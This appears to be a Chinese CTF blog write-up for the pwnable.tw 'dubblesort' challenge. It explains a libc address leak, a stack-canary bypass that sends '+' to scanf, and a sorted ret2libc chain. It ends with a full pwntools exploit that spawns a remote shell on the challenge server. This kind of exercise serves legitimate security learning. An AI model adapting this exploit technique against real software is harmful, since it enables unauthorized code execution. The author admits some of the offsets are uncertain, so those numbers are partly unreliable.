<p>我们断在打印名字的地方<code>0xA32</code>看看</p>
<p><img src="https://i.loli.net/2021/07/13/nacEtulVQR4OXxD.png"></p>
<p>看到ecx的地方就是我们输入的名字，它下面有个got表的地址，距离是<code>dis = 0x58 - 0x3c = 0x1c</code></p>
<div class="note danger"><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>这个距离在我本地打得通，在远程是打不通的，参考了其他大佬的wp后发现，他们的gdb显示的距离算出来是0x18，而0x1c的地方是_init_array的地址，可能问题在我的虚拟机环境上？没搞明白o(╥﹏╥)o</p>
</div>

<p>于是就可以输入<code>dis</code>个<code>a</code>，加上一个回车是<code>\x0a</code>正好把got表地址最低位的<code>\x00</code>覆盖掉，也就不会被截断了，回显的时候减去<code>0x0a</code>就行</p>
<p>下面算一下got表的在libc中的偏移：</p>
<ul>
<li><p><strong>本地</strong>可以在gdb中用<code>vmmap</code>命令找到libc基址，用上面泄露的got表地址减去libc基址就是偏移，我本地是0x1b3000</p>
</li>
<li><p><strong>远程</strong>可以用<code>readelf -S libc_32.so.6</code>命令，找到<code>.got.plt</code>的地址</p>
<img src="https://i.loli.net/2021/07/13/KyJiZYQMRVmI9TW.png" style="zoom:50%;" />

<blockquote>
<p>got和plt的内容可以参考：<a href="https://www.jianshu.com/p/0ac63c3744dd">got表和plt表</a> ，<a href="https://www.jianshu.com/p/5092d6d5caa3">四个节的区别</a></p>
<p><a href="https://blog.csdn.net/yfldyxl/article/details/81566279">readelf命令</a></p>
</blockquote>
</li>
</ul>
<p>至此，libc地址就被泄露了</p>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>观察程序可以发现，他没有限制我们输入数字的个数，那么很容易想到栈溢出，然后ret2libc</p>
<p>现在有两个问题：</p>
<ul>
<li>开了canary</li>
<li>它会从小到大排序后再写在栈上原来位置</li>
</ul>
<h4 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h4><blockquote>
<p>这里有个知识点是当scanf()读取非法字符时会发生格式错误，输入不会被写到栈上，由于没有清空缓冲区的函数，这个非法字符会一直留在缓冲区内，导致后面的输入也会报错，都不会被写到栈上。通过查看其它大佬的wp，发现+ - 这些字符会被视为合法输入，但是不会被写到栈上。</p>
</blockquote>
<p>那么在canary的地方放上<code>&#39;+&#39;</code>就行了</p>
<h4 id="布置栈"><a href="#布置栈" class="headerlink" title="布置栈"></a>布置栈</h4><p>先看从numbers到canary的距离为<code>0x7c - 0x1c = 0x60</code>，注意是按int输入的，所以这里要填充<code>0x60 / 4 = 24</code>个0</p>
<p><img src="https://i.loli.net/2021/07/13/TYqvzA5aQHO9bcN.png"></p>
<p>然后在canary填充一个<code>&#39;+&#39;</code></p>
<p>再看canary到retaddr的距离</p>
<p>这里有个很隐蔽的坑，main函数末尾这里，不是平常的<code>leave; retn;</code>，esp被动过了，所以算padding的时候不能用ida在变量那里显示的来算</p>
<p><img src="https://i.loli.net/2021/07/13/jSXfdZLTgFhQ4H6.png"></p>
<p>这样的话，距离就是<code>0x10 + 0xc = 0x1c</code>，所以填充<code>0x1c / 4 = 7</code>个字节的padding，考虑到后面放的就是system函数的地址<code>sys_addr</code>，要求从小到大，padding可以直接是<code>sys_addr</code></p>
<p>再后面是system函数的返回地址，这里是可以随便填一个不小于<code>sys_addr</code>的数，简单起见直接填<code>sys_addr</code></p>
<p>再后面是system函数的参数<code>&#39;\bin\sh&#39;</code>，巧合的是这个字符串在libc中地址刚好大于<code>sys_addr</code></p>
<p>所以如图：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">high addr            +---------------------------------+</span><br><span class="line">                     |            binsh-addr           |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                ebp  +---------------------------------+</span><br><span class="line">                     |             sys_addr            |</span><br><span class="line">                     |               *7                |</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |               &#x27;+&#x27;               | &lt;--- canary</span><br><span class="line">                     +---------------------------------+</span><br><span class="line">                     |               &#x27;0&#x27;               |</span><br><span class="line">                     |               *24               |</span><br><span class="line">low addr     numbers +---------------------------------+</span><br></pre></td></tr></table></figure>

<p>总共输入<code>24+1+7+3=35</code>个数字</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./dubblesort&quot;</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line"><span class="comment">#r = process(&quot;./dubblesort&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line">local_got_offset = <span class="number">0x1b3000</span></span><br><span class="line">remote_got_offset = <span class="number">0x1b0000</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;name :&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>)  <span class="comment">#why remote is 24 but local is 28?</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Hello &#x27;</span>)</span><br><span class="line">r.recv(<span class="number">24</span>)</span><br><span class="line">libc_addr = u32(r.recv(<span class="number">4</span>)) - <span class="number">0xa</span></span><br><span class="line"><span class="comment">#libc_addr = libc_addr - local_got_offset</span></span><br><span class="line">libc_addr = libc_addr - remote_got_offset</span><br><span class="line">sys_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_addr:&quot;</span>, <span class="built_in">hex</span>(libc_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;sys_addr:&quot;</span>, <span class="built_in">hex</span>(sys_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr:&quot;</span>,<span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">24</span> + <span class="number">1</span> + <span class="number">7</span> + <span class="number">3</span> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;cnt:&quot;</span>,cnt</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(cnt))</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):        <span class="comment">#why 7? see code 0xB10</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(sys_addr))</span><br><span class="line">    r.recv()</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(sys_addr)) <span class="comment">#ret_addr</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(sys_addr)) <span class="comment">#ret_addr of sys</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="built_in">str</span>(binsh_addr))</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p><a href="https://v1ckydxp.github.io/2019/05/01/pwnable-tw-dubblesort-writeup/">https://v1ckydxp.github.io/2019/05/01/pwnable-tw-dubblesort-writeup/</a></p>
<p><a href="https://blog.csdn.net/qq_43189757/article/details/102799397">https://blog.csdn.net/qq_43189757/article/details/102799397</a></p>
<p><a href="https://www.cnblogs.com/Rookle/p/12884543.html">https://www.cnblogs.com/Rookle/p/12884543.html</a></p>
<p><a href="https://www.cjovi.icu/WP/919.html">https://www.cjovi.icu/WP/919.html</a></p>
]]></content>
      <categories>
        <category>pwnable.tw</category>
      </categories>
      <tags>
        <tag>stackoverflow</tag>
        <tag>ret2libc</tag>
      </tags>
  </entry>
</search>
